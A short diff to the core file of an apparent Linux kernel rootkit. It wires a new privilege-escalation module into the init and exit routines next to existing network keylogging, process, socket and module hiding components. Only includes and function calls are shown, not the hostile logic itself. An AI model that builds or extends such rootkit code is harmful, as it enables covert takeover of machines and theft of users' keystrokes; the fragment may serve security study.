@@ -28,6 +28,7 @@
 #include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
 #include "module_masking.h"		/* Needed for ... */
 #include "network_keylogging.h"	/* Needed for ... */
+#include "privil_escalation.h"			/* Needed for ... */
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
 #include "conf_manager.h"		/* Needed for ... */
@@ -96,6 +97,7 @@ static int __init core_start(void)
 	//TODO: check return values
 	//module_masking_init(DEBUG_MODE_IS_ON);
 	network_keylogging_init(DEBUG_MODE_IS_ON);
+	privil_escalation_init(DEBUG_MODE_IS_ON);
 	process_masking_init(DEBUG_MODE_IS_ON);
 	socket_masking_init(DEBUG_MODE_IS_ON);
 	conf_manager_init(DEBUG_MODE_IS_ON);
@@ -127,6 +129,7 @@ static void __exit core_end(void)
 	conf_manager_exit();
 	socket_masking_exit();
 	process_masking_exit();
+	privil_escalation_exit();
 	network_keylogging_exit();
 	//module_masking_exit();
 
